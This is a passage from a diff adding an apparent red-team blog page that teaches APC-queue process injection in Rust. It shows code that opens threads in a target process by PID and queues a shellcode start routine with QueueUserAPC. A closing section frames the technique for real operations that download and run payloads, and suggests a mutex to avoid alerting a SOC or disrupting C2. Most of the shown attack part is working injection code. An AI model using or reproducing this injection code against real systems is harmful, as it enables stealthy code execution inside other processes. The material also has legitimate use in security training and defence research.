+            <span class="hljs-keyword">if</span> thread_handle.<span class="hljs-title function_ invoke__">is_err</span>() {
+                <span class="hljs-built_in">eprintln!</span>(<span class="hljs-string">"[-] Failed to open thread: {}"</span>, thread);
+                <span class="hljs-keyword">continue</span>;
+            }
+
+            <span class="hljs-keyword">let</span> <span class="hljs-variable">apc_routine</span>: PAPCFUNC = <span class="hljs-title function_ invoke__">Some</span>(p_thread_start_routine.<span class="hljs-title function_ invoke__">unwrap</span>());
+
+            <span class="hljs-keyword">let</span> <span class="hljs-variable">res</span> = <span class="hljs-title function_ invoke__">QueueUserAPC</span>(apc_routine, thread_handle.<span class="hljs-title function_ invoke__">clone</span>().<span class="hljs-title function_ invoke__">unwrap</span>(), <span class="hljs-number">0</span>);
+            <span class="hljs-keyword">if</span> res == <span class="hljs-number">0</span> {
+                <span class="hljs-built_in">eprintln!</span>(<span class="hljs-string">"Failed to queue APC to thread: {}"</span>, thread);
+            } <span class="hljs-keyword">else</span> {
+                <span class="hljs-built_in">println!</span>(<span class="hljs-string">"[+] APC queued for pid: {}, on thread: {}"</span>, pid, thread);
+            }
+
+            <span class="hljs-comment">// close the thread handle</span>
+            <span class="hljs-keyword">let</span> <span class="hljs-variable">_</span> = <span class="hljs-title function_ invoke__">CloseHandle</span>(thread_handle.<span class="hljs-title function_ invoke__">unwrap</span>());
+
+            <span class="hljs-title function_ invoke__">sleep</span>(Duration::<span class="hljs-title function_ invoke__">from_millis</span>(<span class="hljs-number">200</span>));
+        }
+    }
+}
+
+<span class="hljs-comment">/// Get the pid from the command line when the user starts the program</span>
+<span class="hljs-keyword">fn</span> <span class="hljs-title function_">collect_proc_addr</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">u32</span> {
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">args</span>: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">String</span>&gt; = env::<span class="hljs-title function_ invoke__">args</span>().<span class="hljs-title function_ invoke__">collect</span>();
+
+    <span class="hljs-keyword">if</span> args.<span class="hljs-title function_ invoke__">len</span>() != <span class="hljs-number">2</span> {
+        <span class="hljs-built_in">eprintln!</span>(<span class="hljs-string">"[-] PID required."</span>);
+        <span class="hljs-title function_ invoke__">exit</span>(<span class="hljs-number">1</span>);
+    }
+
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">pid</span> = args[<span class="hljs-number">1</span>].<span class="hljs-title function_ invoke__">clone</span>();
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">pid_as_int</span>: <span class="hljs-type">u32</span> = pid.<span class="hljs-title function_ invoke__">parse</span>().<span class="hljs-title function_ invoke__">unwrap</span>();
+
+    pid_as_int
+}
+
+</code></pre>
+
+<h2 id="taking-it-further">Taking it further</h2>
+
+<p>If you decide to make this yourself, you will notice 10 or so calculators pop up (from the shellcode)! This is somewhat a problem if we were doing a real red team operation; imagine the shellcode actually downloads our payload and runs it. We don’t want this happening 10+ times because:</p>
+
+<ol>
+<li>It may be more likely to alert a SOC, and</li>
+<li>It may cause c2 problems</li>
+</ol>
+
+<p>So, a nice addition to the shellcode portion would be to create a unique mutex, and if it exists, exit. If it doesn’t exist, then continue.</p>
+
+<p>Whilst this post has focussed on shellcode injection with APC Queueing, you can also use this technique with classic <a href="https://fluxsec.red/remote-process-dll-injection" target="_blank">DLL Injection</a>, but replacing <code>CreateRemoteThread</code> with APC injection.</p>
+
+
+            
+
+        </main>
+        
+        
+
+    </div>
+
+
+
+</body></html>
